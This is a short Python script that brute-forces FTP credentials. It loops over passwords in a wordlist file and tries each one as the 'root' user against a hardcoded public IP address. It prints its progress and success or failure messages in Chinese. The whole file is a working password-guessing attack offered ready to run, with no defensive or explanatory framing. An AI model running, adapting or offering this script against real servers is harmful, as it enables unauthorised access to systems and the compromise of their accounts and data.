#!/usr/bin/python
# -*- coding: utf-8 -*-
import ftplib


def ftpLogin(host, Name, PassFile):

    PF = open(PassFile, 'r')
    for line in PF.readlines():
        name = Name
        passwd = str(line).strip()
        print("Trying: "+name+"/"+passwd)
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, 21)
            ftp.login(name, passwd)
            print("登录成功", name, passwd)
            ftp.quit()
            return (name, passwd)
        except Exception as e:
            pass
    print("没有找到正确的密码")
    return None


hostName = '113.105.164.33'
passwordFile = 'pass.txt'

if __name__ == '__main__':
    ftpLogin(hostName, "root", passwordFile)


